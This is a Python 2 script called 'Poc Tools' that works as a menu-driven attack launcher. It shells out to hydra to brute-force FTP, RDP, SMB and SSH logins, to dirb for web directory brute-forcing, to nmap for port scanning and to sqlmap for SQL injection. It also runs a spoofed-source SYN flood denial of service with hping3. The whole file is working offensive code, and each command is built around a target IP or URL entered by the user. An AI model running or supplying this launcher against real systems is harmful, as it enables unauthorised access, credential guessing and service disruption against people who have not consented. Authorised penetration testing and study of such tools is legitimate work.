#!/usr/bin/python
import os
import sys
import re



def Exit():
    sys.exit(0)


def brute_force():
    ftpIp = raw_input("Enter attack target ftp ip: ");
    rdpIp = raw_input("Enter attack target rdpHost ip: ");
    smbIp = raw_input("Enter attack target smbHost ip: ");
    sshIp = raw_input("Enter attack target sshHost ip: ");
    if(ftpIp == ''):
        print '[-] Skip ftp_Brute Attack.'
    else:
        os.system('hydra  -L user.list -P ./passwd.list -e ns -V  ftp://%s'%(ftpIp))
    if(rdpIp == ''):
        print '[-] Skip rdp_Brute Attack.'
    else:
        os.system('hydra -S %s rdp -l administrator -P ./passwd.list -V'%(rdpIp))
    if(smbIp == ''):
		print '[-] Skip smb_Brute Attack.'
    else:
		os.system('hydra -l administrator -P ./passwd.list %s smb -V'%(smbIp))
    if(sshIp == ''):
		print '[-] Skip ssh_Brute Attack.'
    else:
		os.system('hydra -L ./user.list -P ./passwd.list -e ns -V %s ssh'%(sshIp))


def web_dir_brute():
    url = raw_input("Enter attack target url: ");
    if(url == ''):
        print '[-] Input is null'
    else:
        os.system('dirb %s ./common.txt'%(url))

def port_scan():
    hosts = raw_input("Enter scan target hosts ip: ");
    if(hosts == ''):
        print '[-] Input is null.'
    else:
        os.system('nmap -sV %s'%(hosts))

def sqlInject():
    tag = '0'
    inject_type = raw_input("Enter inject_type(get or post): ");
    if(inject_type == ''):
        print '[-] Input is null.'
    elif(inject_type == 'get'):
        url = raw_input("Enter target url: ");
        if(url == ''):
            print '[-] Input is null.'
        else:
             os.system('sqlmap -u "%s"'%(url))
    elif(inject_type == 'post'):
        post_file = raw_input("Enter target post file: ");
        if(post_file == ''):
            print '[-] Input is null.'
        else:
             os.system('sqlmap -r ./%s'%(post_file))

def Dos_attack():
	host = raw_input("Enter attack target host ip: ");
	if(host == ''):
		print '[-] Input is null.'
	else:
		os.system('hping3 -c 1000  -S -w 64 -p 80 --flood --rand-source %s'%(host))

def main():
  os.system('figlet Poc Tools -f /usr/share/figlet/big.flf')
  while(1):
    print "\r\n"  
    print "[*] Please choose attack type:\r"
    print "[*] 1. Port scan.\r"
    print "[*] 2. Password brute_force.\r"
    print "[*] 3. SqlInject attack.\r"
    print "[*] 4. Web dir brute attack.\r"
    print "[*] 5. DOS attack.\r"
    print "[*] 0. Exit script.\r\n"
    attack_type = raw_input("Confirm the type of attack you chose first: ")
    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'5': Dos_attack,'0': Exit}
    start_attack = attacks[attack_type]
    start_attack()
    
if __name__ == '__main__':
    main()
